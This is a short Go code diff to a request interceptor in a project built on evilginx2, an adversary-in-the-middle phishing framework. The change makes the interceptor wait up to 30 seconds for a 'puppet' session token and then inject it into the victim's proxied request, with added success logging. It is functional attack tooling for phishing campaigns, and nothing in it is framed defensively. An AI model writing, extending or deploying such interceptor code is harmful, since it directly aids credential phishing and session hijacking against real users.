@@ -8,6 +8,7 @@ import (
 	"net/url"
 	"regexp"
 	"strings"
+	"time"
 
 	"github.com/kgretzky/evilginx2/log"
 )
@@ -37,12 +38,18 @@ func (ri *RequestInterceptor) InterceptRequest(req *http.Request, sessionID stri
 		if ri.matchesTrigger(req, trigger) {
 			log.Debug("[INTERCEPTOR] Request matches trigger for token: %s", trigger.Token)
 			
-			// Get puppet token for this session
+			// Try to get existing token first (fast path)
 			puppetToken, exists := ri.puppetMaster.GetToken(sessionID, trigger.Token)
 			
 			if !exists {
-				log.Warning("[INTERCEPTOR] No puppet token found for session: %s", sessionID)
-				return req, false
+				// Token doesn't exist yet, wait for puppet to complete
+				log.Info("[INTERCEPTOR] Token not available, waiting for puppet session...")
+				token, err := ri.puppetMaster.WaitForToken(sessionID, trigger.Token, 30*time.Second)
+				if err != nil {
+					log.Warning("[INTERCEPTOR] Failed to wait for puppet token: %v", err)
+					return req, false
+				}
+				puppetToken = token
 			}
 			
 			// Extract original token from request
@@ -70,6 +77,7 @@ func (ri *RequestInterceptor) InterceptRequest(req *http.Request, sessionID stri
 				log.Debug("[INTERCEPTOR] Trigger configured to abort original request")
 			}
 			
+			log.Success("[INTERCEPTOR] Token successfully injected into request")
 			return modifiedReq, true
 		}
 	}
